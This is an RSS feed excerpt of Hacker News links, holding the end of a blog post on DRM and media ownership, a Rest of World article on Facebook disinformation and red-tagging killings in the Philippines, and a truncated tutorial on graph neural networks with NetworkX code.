<p>I do recognize that creators have bills and should be paid fairly for their work. I will continue to pay for my media (that‚Äôs both ‚Äúbought‚Äù and <em>bought</em>) as well support creators directly (Patreon etc).</p>

<hr>

<p><a name="footnote1">1</a>: I did not come up with this, but I also can‚Äôt find out where I read/watched/listened this idea. If you do, let me know.</p>

<p><a name="footnote2">2</a>: I don‚Äôt necessarily mean that if the latest video or audio codec is not supported on Android for example, then the media encoded in that codec breaks my criterion. However the codec spec must be open and not proprietary for alternative implementations.</p>

  </div></div>]]>
            </description>
            <link>https://goel.io/drm-ownership</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930824</guid>
            <pubDate>Thu, 29 Oct 2020 14:31:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[In the Philippines, fake news can get you killed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930687">thread link</a>) | @gbseventeen3331
<br/>
October 29, 2020 | https://restofworld.org/2020/in-the-philippines-fake-news-can-get-you-killed/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/in-the-philippines-fake-news-can-get-you-killed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Just before 8 p.m. on the evening of August 17, Zara Alvarez and her two housemates stepped out of a market in a suburb of Bacolod, a city on Negros Island in the central Philippines. Alvarez, 39, wore black leggings, black basketball shoes, and a black T-shirt with the legend ‚ÄúFrom the Other Side.‚Äù In press photos taken later that night, the rain was so heavy that the streetlights diffused into the murk, each bulb looking like a swollen moon. The women hurried toward their home, a boarding house on nearby Santa Maria Street. In the dark and the downpour, they didn‚Äôt see that they were being followed. As they reached their road, a man approached and fired three shots into Alvarez, who fell. He fired three more times at her prone body and fled, jumping onto a waiting motorcycle.</p>



<p>‚ÄúI‚Äôve covered a lot of murders like that,‚Äù says Nonoy Espina, a veteran journalist from Bacolog, the chairman of the National Union of Journalists of the Philippines, and a friend of Alvarez‚Äôs. ‚ÄúBut when it‚Äôs someone you know ‚Ä¶‚Äù He trails off.</p>



<p>There were two versions of Zara Alvarez. There was the real Alvarez, a prolific human rights activist who worked tirelessly on behalf of communities on Negros Island, despite relentless threats and intimidation. And there was the version that appeared on social media ‚Äî Zara Alvarez, Communist sympathizer and terrorist, a dangerous enemy of the state.&nbsp;</p>



<p>Her killer hasn‚Äôt been identified, but those who knew her say Alvarez was a victim of what is known in the Philippines as ‚Äúred-tagging.‚Äù In 2018, her name <a href="https://www.rappler.com/nation/philippines-terrorist-tag-communist-rebels">appeared on a list</a> published by the country‚Äôs Department of Justice of more than 600 people accused of being members of a violent Communist insurgency. The list, which includes journalists, activists, and opposition politicians, was repeatedly challenged in court and, over the next two years, dwindled to just two names. But even for those who had appeared on it only briefly, the lie was persistent. Accusations against Alvarez continued to circulate on pro-government Facebook pages, along with threats of violence. On the day she was murdered, a funeral had been held in Manila for Randall Echanis, an activist and left-wing politician ‚Äî also on the DOJ‚Äôs list ‚Äî who was <a href="https://www.cnnphilippines.com/news/2020/8/21/Randy-Echanis-autopsy-shows-torture-signs--doctor-says.html">tortured and killed in his home</a> in Quezon City.&nbsp;</p>



<p>Under President Rodrigo Duterte, such falsehoods, emanating from the heart of his government, have become routine. The president, his spokespeople, his ministers, and his surrogates habitually make or repeat unfounded accusations against their opponents, while broadcasting inflated or entirely fabricated accounts of their own success. Those claims ‚Äî in fact, almost the entirety of the country‚Äôs mainstream political discourse ‚Äî are mediated through Facebook, which is used by 97% of Filipinos with internet access.</p>



<p>That has given the platform an outsize influence in Filipino politics, even as it tries to stay above the fray, declining to fact-check political figures and relying instead on its highly subjective ‚Äúcommunity standards‚Äù to police threats of violence.</p>



<p>This is a story playing out all over the world ‚Äî and very visibly in the U.S., which is in the middle of a divisive election campaign that has been fueled by conspiracy theories and fought on the basis of wildly different interpretations of reality. But in the Philippines, Facebook‚Äôs equivocations are uniquely dangerous, as falsehoods feed back into an aggressive political culture that has encouraged the extrajudicial killing of thousands of citizens.</p>



<p>‚ÄúI‚Äôm not sure what [Facebook] should do. I‚Äôm against censorship of any kind,‚Äù Espina says. ‚ÄúBut, definitely, they‚Äôre not doing enough to prevent the spread of fake news. There‚Äôs just too many lies to expose. And some of these lies, like red-tagging, have proven to be fatal.‚Äù</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/GettyImages-1155241185-40x28.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/GettyImages-1155241185-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/GettyImages-1155241185-400x279.jpg 400w, https://restofworld.org/wp-content/uploads/2020/10/GettyImages-1155241185-600x419.jpg 600w, https://restofworld.org/wp-content/uploads/2020/10/GettyImages-1155241185-1000x699.jpg 1000w, https://restofworld.org/wp-content/uploads/2020/10/GettyImages-1155241185-1600x1118.jpg 1600w, https://restofworld.org/wp-content/uploads/2020/10/GettyImages-1155241185-2800x1956.jpg 2800w, " sizes="(max-width: 640px) 100vw, 600px(max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="Cristina Palabay, the Secretary General of Karapatan, speaks during a press confence in Manila in 2019.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Ted Aljibe/AFP via Getty Images</span>
			</figcaption>
		</figure>


<hr>



<p>Alvarez is <a href="https://www.latimes.com/world-nation/story/2020-08-27/philippines-zara-alvarez-human-rights">the 13th member</a> of the human rights coalition Karapatan to have been murdered since Duterte came to power in 2016. Their deaths follow a pattern. First, lies about them enter the public sphere. Their faces appear on posters and flyers, warning that they are terrorists or Communist sympathizers. Then the lies spread to social media, where they are amplified through pro-government accounts. Then threats start to come via SMS. It usually ends one of two ways: arrest on some tenuous charge or death.&nbsp;</p>



<p>‚ÄúIf you‚Äôre branded, it means that you‚Äôre fair game,‚Äù says Cristina Palabay, Karapatan‚Äôs secretary general. ‚ÄúIt means that you‚Äôre a combatant. Even if it is not true.‚Äù</p>



<p>In Duterte‚Äôs Philippines ‚Äî at least, the vision of it he has been broadcasting relentlessly since his 2016 presidential run ‚Äî everyone is a combatant. It is the same fiction he began pushing in the campaign, that of a country in the thrall of violent drug dealers, Communists, and terrorists, which could be saved only by a strongman willing to take up arms himself.</p>



<p>Duterte, for nearly two decades the mayor of the city of Davao in the troubled southern Philippine state of Mindanao, fits the bill as a classic law-and-order strongman, strutting, aggressive, and constantly accompanied by rumors of vigilante death squads and extrajudicial killings. ‚ÄúHe had two decades of perfecting [his persona] on the very frontiers of the Philippine nation-state,‚Äù says political analyst Richard Heydarian, author of a biography of the president.&nbsp;</p>



<p>Despite his age ‚Äî at 71, he was the oldest person ever elected to the presidency ‚Äî Duterte and his camp proved startlingly adept at using social media to project his version of reality. Thanks to ‚ÄúFree Basics‚Äù ‚Äî gratis, limited access to data, provided through the Facebook app ‚Äî tens of millions of Filipinos have come online, and in particular onto Facebook, which is at once their internet-service provider and the front page of their internet. While more traditional, technocratic candidates and their supporters coldly disseminated information on the platform, Duterte‚Äôs cheerleaders were able to reach something deeper in the electorate, creating then amplifying their fears.&nbsp;</p>



<p>‚ÄúThere‚Äôs something about the limbic resonance of what they do,‚Äù Heydarian says. ‚ÄúThere‚Äôs something about the libidinal traction that their posts have. It‚Äôs more visceral. It‚Äôs even sexier, in a twisted way.‚Äù</p>



<p>It is likely that Duterte had expert help in his campaign. Strategic Communications Limited, parent company of the disgraced political consultancy Cambridge Analytica, <a href="https://www.rappler.com/nation/facebook-data-scandal-cambridge-analytica-help-duterte-win-philippine-elections">boasted on its website</a> that it had helped an unnamed candidate in the 2016 Philippines election by ‚Äúrebrand[ing] the client as a strong, no-nonsense man of action.‚Äù But real people also propelled Duterte into Malaca√±ang, the country‚Äôs presidential palace, caught up in the rage and fear that the candidate projected.</p>



<p>Once he got into office, Duterte set about deepening the narrative that he had created on Facebook and imposing it on the real world.&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/h_15025427-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/h_15025427-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/h_15025427-400x272.jpg 400w, https://restofworld.org/wp-content/uploads/2020/10/h_15025427-600x408.jpg 600w, https://restofworld.org/wp-content/uploads/2020/10/h_15025427-1000x680.jpg 1000w, https://restofworld.org/wp-content/uploads/2020/10/h_15025427-1600x1088.jpg 1600w, https://restofworld.org/wp-content/uploads/2020/10/h_15025427-2800x1904.jpg 2800w, " sizes="(max-width: 640px) 100vw, 600px(max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="President Donald Trump and President Rodrigo Duterte at a meeting in Manila in 2017. Both leaders have used social media to spread lies and stoke supporters. ">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>‚ÄúIn the election, Duterte used Facebook,‚Äù says Maria Ressa, cofounder and CEO of Rappler, a news site that has been chronicling online disinformation in the Philippines since 2016. ‚ÄúAfter he was elected and the drug war began, Facebook was weaponized.‚Äù</p>



<p>Some of Duterte‚Äôs trollish cheerleaders were brought into government. In 2017, he appointed Mocha Uson ‚Äî a former singer whose pop-culture-and-sex-advice Facebook page pivoted to become a pro-Duterte blog ahead of the election ‚Äî as assistant press secretary. Uson‚Äôs page has repeatedly been <a href="https://newsinfo.inquirer.net/895904/mocha-uson-to-defend-duterte-against-misinformation-in-media">accused of spreading falsehoods</a>.&nbsp;</p>



<p>(Uson subsequently resigned, ran for congress, lost, and then resurfaced in 2019, when she <a href="https://news.abs-cbn.com/news/10/01/19/back-in-government-mocha-uson-part-of-dutertes-trip-to-russia">accompanied Duterte on a state visit to Russia</a>, in a new government role. She is <a href="https://www.msn.com/en-ph/news/national/mocha-uson-the-queen-of-fake-news-summoned-by-nbi-for-spreading-fake-news-again/ar-BB144u2p?li=BBr8zL6">currently under investigation</a> for allegedly breaching a law aimed at preventing the spread of misinformation related to the coronavirus pandemic.)</p>



<p>From inside government, Uson and others like her continued to pump out the same frightening and often fictitious narratives. In one much-criticized incident, Uson used a picture of a murder victim from Brazil as ‚Äúevidence‚Äù of drug-related violence in the Philippines. The president‚Äôs campaign spokesperson, Peter Tiu Lavi√±a, <a href="https://www.rappler.com/nation/duterte-camp-brazil-photo-rape-victim-critics">also shared the image</a>.</p>



<p>It was a short step from advocating violence to enacting it;&nbsp;the killings began almost immediately after Duterte arrived in Malaca√±ang. Having established that it was right to kill the drug users he said were terrorizing society, the president gave the people his blessing to go out and do it. Anyone who stood up to the policy faced a torrent of abuse.</p>



<p>‚ÄúHow do you normalize killing? You use Facebook,‚Äù Ressa says. ‚ÄúAnyone who questioned the drug war was pummeled on Facebook, so people became quiet. When people are quiet, the norm becomes the propaganda that was seeded, which was ‚ÄòIt‚Äôs OK to kill.‚Äô That‚Äôs something that I would never have expected Filipinos to accept, but I watched it happen.‚Äù</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/IMG_0938-40x71.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/IMG_0938-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/IMG_0938-400x711.png 400w, https://restofworld.org/wp-content/uploads/2020/10/IMG_0938-600x1067.png 600w, " sizes="300px" alt="Alex Monteagudo, the Director-General of the national intelligence agency, uses Facebook excessively.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder"><a href="https://www.facebook.com/lorraine.badoy/posts/10158709791484834" target="_blank" rel="noopener noreferrer">Facebook</a></span>
			</figcaption>
		</figure>


<p>Officially, more than 5,500 ‚Äúdrug offenders‚Äù have been killed by police since Duterte took power. However, human rights groups estimate that, <a href="https://www.hrw.org/world-report/2020/country-chapters/philippines">in total, 27,000 people have died</a> in the wave of vigilantism, as security forces take the opportunity to settle scores with impunity.&nbsp;</p>



<p>With the lawless, brutal society that he had envisioned now firmly established, Duterte and his administration are turning the weight of his fictions on the people who have challenged or exposed them.&nbsp;</p>



<p>As in the election, Facebook is the platform on which this unsettling of Filipino reality has played out. The lies often come straight out of the official organs of state. Alex Monteagudo, the director general of the National Intelligence Coordinating Agency, <a href="https://www.rappler.com/nation/philippines-intelligence-chief-monteagudo-regular-sharer-fake-information-facebook">routinely shares images</a> on Facebook of opposition politicians, calling them ‚Äúcommunist terrorist provocateurs‚Äù and ‚Äúterrorist mafias.‚Äù&nbsp;</p>



<p>The <a href="https://www.facebook.com/ntfelcac/">Facebook page</a> of the National Task Force to End Local Communist Armed Conflict, a body ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/in-the-philippines-fake-news-can-get-you-killed/">https://restofworld.org/2020/in-the-philippines-fake-news-can-get-you-killed/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/in-the-philippines-fake-news-can-get-you-killed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24930687</guid>
            <pubDate>Thu, 29 Oct 2020 14:20:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Graph Neural Networks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24930676">thread link</a>) | @nikita30
<br/>
October 29, 2020 | https://heartbeat.fritz.ai/introduction-to-graph-neural-networks-c5a9f4aa9e99 | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/introduction-to-graph-neural-networks-c5a9f4aa9e99">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><h2 id="47cc">Graph neural networks ‚Äî their need, real-world applications, and basic architecture with the NetworkX library</h2><div><div><div><p><a href="https://medium.com/@nikitasharma_43692?source=post_page-----c5a9f4aa9e99--------------------------------" rel="noopener"><img alt="Nikita Sharma" src="https://miro.medium.com/fit/c/96/96/1*vEIrEpXU4y727YADsJSNaA.jpeg" width="48" height="48"></a></p></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="An image of a light fixture with multiple bulbs. All of the lights are connected with straight or bent lines to the plug." src="https://miro.medium.com/max/4156/1*gkanLNHVltDw3AjHv54JWg.jpeg" width="2078" height="3320" srcset="https://miro.medium.com/max/552/1*gkanLNHVltDw3AjHv54JWg.jpeg 276w, https://miro.medium.com/max/1104/1*gkanLNHVltDw3AjHv54JWg.jpeg 552w, https://miro.medium.com/max/1280/1*gkanLNHVltDw3AjHv54JWg.jpeg 640w, https://miro.medium.com/max/1400/1*gkanLNHVltDw3AjHv54JWg.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/38/1*gkanLNHVltDw3AjHv54JWg.jpeg?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@bracht?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener">Fabio Bracht</a> on <a href="https://unsplash.com/s/photos/connection?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener">Unsplash</a></figcaption></figure><p id="5781">In this post, we are going to investigate a relatively newer field in deep learning which involves graphs ‚Äî a very important and widely used data structure. This post encompasses the basics of graphs, the amalgamation of graphs and deep learning, and a basic idea about graph neural networks and their applications. We will also briefly discuss on how to build graphs with a Python library called NetworkX</p><p id="e390"><em>So, let‚Äôs dive right in!</em></p><p id="d06d">In the world of computer science, graphs are a type of data structure having two components: Nodes (or vertices) and edges, which connect two nodes. Thus, a graph can be defined as a collection of loosely inter-connected nodes via edges.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7954/1*1ASEWlSzqsGJdDwht4Pi0Q.jpeg" width="3977" height="1690" srcset="https://miro.medium.com/max/552/1*1ASEWlSzqsGJdDwht4Pi0Q.jpeg 276w, https://miro.medium.com/max/1104/1*1ASEWlSzqsGJdDwht4Pi0Q.jpeg 552w, https://miro.medium.com/max/1280/1*1ASEWlSzqsGJdDwht4Pi0Q.jpeg 640w, https://miro.medium.com/max/1400/1*1ASEWlSzqsGJdDwht4Pi0Q.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*1ASEWlSzqsGJdDwht4Pi0Q.jpeg?q=20"></p></div></div></div><figcaption>Image Source: <a href="https://medium.com/data-structures-and-algorithms/graph-dd2b72c32f1f" rel="noopener">https://medium.com/data-structures-and-algorithms/graph-dd2b72c32f1f</a></figcaption></figure><p id="8e01">The<strong> </strong>nodes of a graph can be homogenous with all nodes having a similar structure, or heterogenous nodes having different types of structure. The edges define the relationship one node has with another. Edges can be bidirectional (from one node u to another v and vice versa), or unidirectional (from one node u to another node v). Edges can also be weighted ‚Äî having a weight assigned to the edge that might depict the edge‚Äôs cost or importance.</p><p id="b3da"><em>An example:</em> Let us suppose a graph to be considered as a network of cities ‚Äî the cities under observation being nodes and the roads connecting them being edges. Now, there can be various types of relevant problems that can be solved with graphs, such as finding out the shortest distance between cities (where roads can also be weighted as per the condition of the roads or traffic), or finding the cities which are well-connected to each other, etc.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1300/1*ao-FSJHJ-cGU_yYCxTOA3A.png" width="650" height="404" srcset="https://miro.medium.com/max/552/1*ao-FSJHJ-cGU_yYCxTOA3A.png 276w, https://miro.medium.com/max/1104/1*ao-FSJHJ-cGU_yYCxTOA3A.png 552w, https://miro.medium.com/max/1280/1*ao-FSJHJ-cGU_yYCxTOA3A.png 640w, https://miro.medium.com/max/1300/1*ao-FSJHJ-cGU_yYCxTOA3A.png 650w" sizes="650px" data-old-src="https://miro.medium.com/max/60/1*ao-FSJHJ-cGU_yYCxTOA3A.png?q=20"></p></div></div><figcaption>Image Source: <a href="https://www.raywenderlich.com/773-swift-algorithm-club-graphs-with-adjacency-list" rel="noopener">https://www.raywenderlich.com/773-swift-algorithm-club-graphs-with-adjacency-list</a></figcaption></figure><h2 id="878f">What are Graph Neural Networks (GNN)?</h2><p id="85e3">Graphs have tremendous expressive powers and are therefore gaining a lot of attention in the field of machine learning. Every node has an embedding associated with it that defines the node in the data space. Graph neural networks refer to the neural network architectures that operate on a graph. The aim of a GNN is for each node in the graph to learn an embedding containing information about its neighborhood (nodes directly connected to the target node via edges). This embedding can then be used for different problems like node labelling, node prediction, edge prediction, etc.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2286/1*7VzFWjVoAdqrDBRQWCPvnA.png" width="1143" height="508" srcset="https://miro.medium.com/max/552/1*7VzFWjVoAdqrDBRQWCPvnA.png 276w, https://miro.medium.com/max/1104/1*7VzFWjVoAdqrDBRQWCPvnA.png 552w, https://miro.medium.com/max/1280/1*7VzFWjVoAdqrDBRQWCPvnA.png 640w, https://miro.medium.com/max/1400/1*7VzFWjVoAdqrDBRQWCPvnA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*7VzFWjVoAdqrDBRQWCPvnA.png?q=20"></p></div></div></div><figcaption>Each node and its neighborhood</figcaption></figure><p id="8b2f">Thus, after having embeddings associated with each node, we can convert edges by adding feed forward neural network layers and combine graphs and neural networks.</p><h2 id="b3df">Need for Graph Neural Networks</h2><p id="e37c">The need for graph neural networks arose from the fact that a lot of data available to us is in an unstructured format. Unstructured data is data that has not been processed or does not have a pre-defined format which makes it difficult to analyze. Examples of such data are audio, emails, and social media postings. To make sense of this data and to derive inferences from it, we need a structure that defines a relationship between these unstructured data points. The existing machine learning architectures and algorithms do not seem to perform well with these kinds of data. The primary advantages of graph neural networks are:</p><ol><li id="02e9">The graph data structure has proven tremendously successful in the field of computer science while working with unstructured data.</li><li id="43bd">Graphs are helpful in defining concepts which are abstract, like relationships between entities. Since each node in the graph is defined by its connections and neighbors, graph neural networks can capture the relationships between nodes in an efficient manner.</li></ol><p id="7936">Thus, developing GNNs for handling data like social network data, which is highly unstructured, is an exciting amalgamation of graphs and machine learning which holds a lot of potential.</p><h2 id="2fd5">Real-Life Applications of Graph Neural Network</h2><p id="58cb">Being introduced recently in 2018, the GNNs still have a lot of real-life applications because their architecture resonates with the irregularity in data collected from various sources. Currently, GNNs have been the hot topic for:</p><p id="6e5a"><strong>Social Network Analysis</strong> ‚Äî Similar posts prediction, tags prediction, and recommending content to users.</p><p id="d34c"><strong>Natural Sciences </strong>‚Äî GNNs have also gained popularity in dealing with molecular interactions like protein-protein interactions.</p><p id="8b9e"><strong>Recommender Systems </strong>‚Äî A heterogenous graph can be used to capture relationships between users and items to recommend relevant items to a buyer.</p></div></div></section><section><div><div><p id="a689">After we have the basic structure of the graph neural network (nodes with their embeddings and edges with feed forward layers), we can move forward to understanding how GNNs actually work.</p><p id="0827">The basic idea is to learn neighborhood embeddings by aggregating information from a node‚Äôs neighbors via edges using neural networks.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2310/1*lPaI-f9FdVIQCmui2ljn2g.png" width="1155" height="537" srcset="https://miro.medium.com/max/552/1*lPaI-f9FdVIQCmui2ljn2g.png 276w, https://miro.medium.com/max/1104/1*lPaI-f9FdVIQCmui2ljn2g.png 552w, https://miro.medium.com/max/1280/1*lPaI-f9FdVIQCmui2ljn2g.png 640w, https://miro.medium.com/max/1400/1*lPaI-f9FdVIQCmui2ljn2g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*lPaI-f9FdVIQCmui2ljn2g.png?q=20"></p></div></div></div><figcaption>Image source: <a href="http://snap.stanford.edu/proj/embeddings-www/files/nrltutorial-part2-gnns.pdf" rel="noopener">http://snap.stanford.edu/proj/embeddings-www/files/nrltutorial-part2-gnns.pdf</a></figcaption></figure><h2 id="0f02">Neighborhood Aggregation or Message Passing</h2><p id="99a1">Message passing refers to passing and receiving information between nodes about its neighborhood. Consider a target node having its initial embeddings: It receives information from its neighbors passed via edge neural networks. Data from these edges are aggregated (many techniques are used, like max pooling, averaging, etc.,) and passed to the activation unit of a node to get a new set of embeddings for the node. Every node in the initial setup has features x_v. The embeddings for each node after message passing can be defined as:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1708/1*XI7j33ktxcDbdqlHiUSBoQ.png" width="854" height="134" srcset="https://miro.medium.com/max/552/1*XI7j33ktxcDbdqlHiUSBoQ.png 276w, https://miro.medium.com/max/1104/1*XI7j33ktxcDbdqlHiUSBoQ.png 552w, https://miro.medium.com/max/1280/1*XI7j33ktxcDbdqlHiUSBoQ.png 640w, https://miro.medium.com/max/1400/1*XI7j33ktxcDbdqlHiUSBoQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*XI7j33ktxcDbdqlHiUSBoQ.png?q=20"></p></div></div></div><figcaption>taken from the research paper: <a href="https://arxiv.org/pdf/1812.08434.pdf" rel="noopener">https://arxiv.org/pdf/1812.08434.pdf</a></figcaption></figure><p id="f694">Where <em>x_ne[v]</em> denotes the features of the neighbors of <em>v, x_co[v]</em> is the edge features connected to <em>v, h_ne[v] </em>is the embedding of the neighbors of v.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2184/1*ysh3sKgHjKAsPWaoX_TA7g.jpeg" width="1092" height="612" srcset="https://miro.medium.com/max/552/1*ysh3sKgHjKAsPWaoX_TA7g.jpeg 276w, https://miro.medium.com/max/1104/1*ysh3sKgHjKAsPWaoX_TA7g.jpeg 552w, https://miro.medium.com/max/1280/1*ysh3sKgHjKAsPWaoX_TA7g.jpeg 640w, https://miro.medium.com/max/1400/1*ysh3sKgHjKAsPWaoX_TA7g.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ysh3sKgHjKAsPWaoX_TA7g.jpeg?q=20"></p></div></div></div><figcaption>Image Source: <a href="http://snap.stanford.edu/proj/embeddings-www/files/nrltutorial-part2-gnns.pdf" rel="noopener">http://snap.stanford.edu/proj/embeddings-www/files/nrltutorial-part2-gnns.pdf</a></figcaption></figure><p id="21ec">In the above figure, h‚Çê‚ÅΩ¬π‚Åæ is the initial embedding of the node, hN‚Çê‚ÅΩ¬π‚Åæ is the aggregated embeddings of its neighbors. Combining these and passing to the node‚Äôs activation unit or filter will provide the new embedding for node A, which will also contain information about its neighbors. In this manner, each node gets a new set of embeddings for itself which determines its position in the graph. With various iterations or K layers of message passing, a node learns more and more about its neighborhood and its distant neighbors as well.</p><p id="34e2">Eventually, each node has a rough idea about the complete graph (or a part of it, depending on the number of iterations and node-node distance/path or layers considered).</p><p id="5d4b"><em>An example:</em> Consider a graph with social media posts as nodes. Now, if these nodes have embeddings and are labelled with tags like romance, science, comedy, etc., we get a new post and we need to provide it with a tag. Using the existing network and embeddings, neighborhood aggregation will help us predict the labels and embeddings for the unseen node.</p><p id="9d39"><strong>Advantage:</strong> Rather than running the entire algorithm again, we can just use embeddings of the neighbors to determine the locality of the new post. Therefore, GNN-based recommendation can be more efficient and scalable than other traditional machine learning recommendation algorithms out there for dealing large datasets.</p><p id="3b81">Graphs are used with various existing neural network architectures to yield promising results for various machine learning problems. The two most dominant networks are discussed briefly below.</p><h2 id="e7ab">Graph Convolutional Networks (GCNs)</h2><p id="9760">Convolutional neural networks(CNNs) have been vastly used for image classification and segmentation problems. Convolutional operation refers to applying a spatial filter to the input image and getting a feature map as a result.</p><p id="50dc"><em>You can read more about CNNs </em><a href="https://en.wikipedia.org/wiki/Convolutional_neural_network" rel="noopener"><em>here</em></a><em>.</em></p><p id="0205">GCNs refer to applying a spatially moving filter over the nodes of the graph which contains embeddings or data relevant to each node to get a feature representation of each node. Stacking a number of convolutional layers like a regular CNN can also be done to incorporate information from larger neighborhoods.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/1*gzid1GA297zfpZm1IWIDOQ.png" width="1600" height="796" srcset="https://miro.medium.com/max/552/1*gzid1GA297zfpZm1IWIDOQ.png 276w, https://miro.medium.com/max/1104/1*gzid1GA297zfpZm1IWIDOQ.png 552w, https://miro.medium.com/max/1280/1*gzid1GA297zfpZm1IWIDOQ.png 640w, https://miro.medium.com/max/1400/1*gzid1GA297zfpZm1IWIDOQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*gzid1GA297zfpZm1IWIDOQ.png?q=20"></p></div></div></div><figcaption>Image source: <a href="https://www.experoinc.com/post/node-classification-by-graph-convolutional-network" rel="noopener">https://www.experoinc.com/post/node-classification-by-graph-convolutional-network</a></figcaption></figure><h2 id="a5c8">Graph Auto-Encoder Networks</h2><p id="b199">Auto-encoders are neural networks which consist of two networks combined via a bottleneck layer: An encoder, which downsamples the input by passing it through convolutional filters to provide the compact feature representation of the image, and a decoder<strong> </strong>which takes the representation provided by the encoder as input and tries to re-construct the input according to the same.</p><p id="1547">You can read more about auto-encoders <a href="https://en.wikipedia.org/wiki/Autoencoder" rel="noopener">here</a>.</p><p id="2eed">Graph auto-encoders try to learn a compact representation of the graph and then re-construct the graph using the decoder. They can be used to learn graph embeddings and hence can be used for predicting embeddings for un-seen nodes and to classify newer nodes into existing categories within the graph.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1658/1*ywcpaQbVybK3BYm7gO_xAw.jpeg" width="829" height="270" srcset="https://miro.medium.com/max/552/1*ywcpaQbVybK3BYm7gO_xAw.jpeg 276w, https://miro.medium.com/max/1104/1*ywcpaQbVybK3BYm7gO_xAw.jpeg 552w, https://miro.medium.com/max/1280/1*ywcpaQbVybK3BYm7gO_xAw.jpeg 640w, https://miro.medium.com/max/1400/1*ywcpaQbVybK3BYm7gO_xAw.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ywcpaQbVybK3BYm7gO_xAw.jpeg?q=20"></p></div></div></div><figcaption>Image source: <a href="https://www.frontiersin.org/articles/10.3389/fdata.2019.00002/full" rel="noopener">https://www.frontiersin.org/articles/10.3389/fdata.2019.00002/full</a></figcaption></figure><p id="74b3"><em>Other kinds of graph neural networks like spatial and temporal graph neural networks, generative graph neural networks, recurrent graph neural networks, etc., have also been developed.</em></p><p id="f4ee">NetworkX, as mentioned in its documentation, is a ‚ÄúPython package for the creation, manipulation, and study of the structure, dynamics, and functions of complex networks.‚Äù<em> </em>Let‚Äôs learn how to build graphs with NetworkX:</p><p id="f7b4"><strong>Install NetworkX:</strong></p><pre><span id="0b40">pip install networkx</span></pre><p id="c40f"><strong>Creating a graph:</strong></p><pre><span id="2aa8"><strong>import</strong> <strong>networkx</strong> <strong>as</strong> <strong>nx</strong><br>G = nx.Graph()<br>#defines an empty graph</span></pre><p id="dabb"><strong>Adding nodes to the graph:</strong></p><pre><span id="01dc">#adds node 1<br>G.add_node(1)<br>#adds nodes from any iterable like list<br>G.add_nodes_from([2, 3])</span></pre><p id="b044"><strong>Adding edges to the graph:</strong></p><pre><span id="687a">#adding an edge from first node to another<br>G.add_edge(1, 2)<br>#adding edges from a list<br>G.add_edges_from([(1, 2), (1, 3)])<br>#adding a weighted edge<br>G.add_edge(1, 2, weight=4.5)</span></pre><p id="3a10">In this manner, we can construct a graph that we want to work on. Here is a simple example to find the shortest path between two nodes:</p><pre><span id="2163">import networkx as nx<br>G = nx.Graph()<br>G.add_ed‚Ä¶</span></pre></div></div></section></div>
